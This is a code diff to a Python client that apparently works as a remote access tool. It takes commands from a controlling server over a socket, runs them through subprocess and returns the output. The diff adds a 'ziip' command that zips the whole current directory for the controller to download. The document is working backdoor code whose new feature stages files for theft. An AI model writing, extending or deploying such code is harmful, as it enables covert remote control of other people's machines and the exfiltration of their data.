@@ -1,4 +1,5 @@
 import os
+import zipfile
 import subprocess
 import time
 from hashlib import sha256
@@ -108,11 +109,15 @@ def command():
     command = clientSocket.recv(1024).decode()
     print('Executing command ' + command)
     try:
-        output = subprocess.check_output(command)
-        if output:
-            clientSocket.send(str(len(output)).encode())
-            clientSocket.sendall(output)
+        if command != 'ziip':
+            output = subprocess.check_output(command)
+            if output:
+                clientSocket.send(str(len(output)).encode())
+                clientSocket.sendall(output)
+            else:
+                clientSocket.send('No Output'.encode())
         else:
+            ziip()
             clientSocket.send('No Output'.encode())
     except FileNotFoundError:
         print('Command not found')
@@ -128,6 +133,16 @@ def platform():
         clientSocket.send('Linux'.encode())
     else:
         clientSocket.send('Unknown'.encode())
+def ziip():
+    global current_path
+
+    with zipfile.ZipFile('result.zip','w',zipfile.ZIP_DEFLATED) as newZip:
+        for dirpath,dirnames,files in os.walk(current_path):
+            for file in files:
+                newZip.write(os.path.join(dirpath,file))
+
+    result='Directory zipped and ready to download named result.zip'
+    clientSocket.send(result.encode())
 
 
 switcher = {
@@ -139,7 +154,9 @@ switcher = {
     'cdhome': cdhome,
     'cd': cd,
     'command': command,
-    'platform': platform}
+    'platform': platform,
+    'ziip' : ziip
+}
 
 connected = False
 while True:
